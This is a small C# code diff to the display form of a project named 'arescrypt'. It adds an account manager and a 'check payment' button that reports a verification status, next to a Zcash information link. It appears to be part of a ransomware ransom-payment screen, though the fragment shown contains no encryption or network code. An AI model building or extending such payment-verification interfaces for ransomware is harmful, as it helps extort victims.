@@ -12,6 +12,7 @@ namespace arescrypt
         static extern void mouse_event(uint dwflag);
         static Configuration config = new Configuration();
         static UserData userData = new UserData();
+        static AccountManager accountManager = new AccountManager();
 
         public Display() {
             InitializeComponent();
@@ -100,5 +101,10 @@ namespace arescrypt
 
         private void aboutZcash_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e)
         { MessageBox.Show("Learn more about Zcash at [https://z.cash/]"); } // Process.Start("https://z.cash/"); }
+
+        private void checkpaymentBtn_Click(object sender, EventArgs e)
+        {
+            MessageBox.Show("Verified? " + accountManager.CheckVerification());
+        }
     }
 }
